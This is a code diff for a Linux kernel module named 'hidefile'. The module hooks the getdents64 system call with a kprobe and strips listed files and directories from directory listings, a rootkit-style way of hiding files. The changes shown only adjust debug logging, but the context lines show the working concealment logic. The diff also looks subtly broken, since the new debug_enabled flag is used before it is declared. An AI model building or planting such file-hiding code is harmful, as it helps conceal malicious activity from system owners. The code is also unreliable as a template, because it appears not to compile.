@@ -129,18 +129,10 @@ void clear_hidden_list(void)
 	pr_info("[hidefile] hidden list cleared\n");
 }
 
-/* Kprobe pre_handler - called before getdents64 */
+/* Kprobe pre_handler - called before getdents64 executes */
 static int kp_pre_handler(struct kprobe *p, struct pt_regs *regs)
 {
-	unsigned int fd;
-	void __user *dirent;
-
-	/* Get arguments: x0=fd, x1=dirent */
-	fd = regs->regs[0];
-	dirent = (void __user *)regs->regs[1];
-
-	pr_info("[hidefile] *** getdents64 CALLED *** fd=%u, dirent=%px\n", fd, dirent);
-
+	/* Nothing to do here - we log in post_handler only to avoid log flood */
 	return 0;
 }
 
@@ -166,14 +158,16 @@ static void kp_post_handler(struct kprobe *p, struct pt_regs *regs,
 	/* Get arguments */
 	dirent = (struct linux_dirent64 __user *)regs->regs[1];
 
-	pr_info("[hidefile] getdents64 returned: ret=%d, hidden_count=%d\n", count, hidden_count);
+	if (debug_enabled) {
+		pr_info("[hidefile] getdents64 returned: ret=%d, hidden_count=%d\n", count, hidden_count);
 
-	/* Print hidden list */
-	for (i = 0; i < hidden_count; i++) {
-		if (hidden_files[i].active)
-			pr_info("[hidefile]   hidden[%d]: %s (%s)\n",
-				i, hidden_files[i].name,
-				hidden_files[i].is_dir ? "DIR" : "FILE");
+		/* Print hidden list */
+		for (i = 0; i < hidden_count; i++) {
+			if (hidden_files[i].active)
+				pr_info("[hidefile]   hidden[%d]: %s (%s)\n",
+					i, hidden_files[i].name,
+					hidden_files[i].is_dir ? "DIR" : "FILE");
+		}
 	}
 
 	/* Allocate kernel buffer */
@@ -203,13 +197,16 @@ static void kp_post_handler(struct kprobe *p, struct pt_regs *regs,
 		strncpy(name, curr->d_name, sizeof(name) - 1);
 		entries_total++;
 
-		pr_info("[hidefile]   [%d] %s (%s)",
-			entries_total, name,
-			curr->d_type == DT_DIR ? "DIR" : "FILE");
+		if (debug_enabled) {
+			pr_info("[hidefile]   [%d] %s (%s)\n",
+				entries_total, name,
+				curr->d_type == DT_DIR ? "DIR" : "FILE");
+		}
 
 		if (is_hidden(name, curr->d_type == DT_DIR)) {
 			entries_hidden++;
-			pr_info("[hidefile]   --> MATCHED (will hide): %s", name);
+			if (debug_enabled)
+				pr_info("[hidefile]   --> MATCHED (will hide): %s\n", name);
 		} else {
 			/* Keep this entry */
 			if (write_ptr != curr)
@@ -242,6 +239,9 @@ static void kp_post_handler(struct kprobe *p, struct pt_regs *regs,
 extern int vfs_hook_init(void);
 extern void vfs_hook_exit(void);
 
+/* Debug flag - set to 1 for verbose logging */
+static int debug_enabled = 1;
+module_param(debug_enabled, int, 0644);
 static bool kprobe_registered;
 
 static int __init hook_init(void)
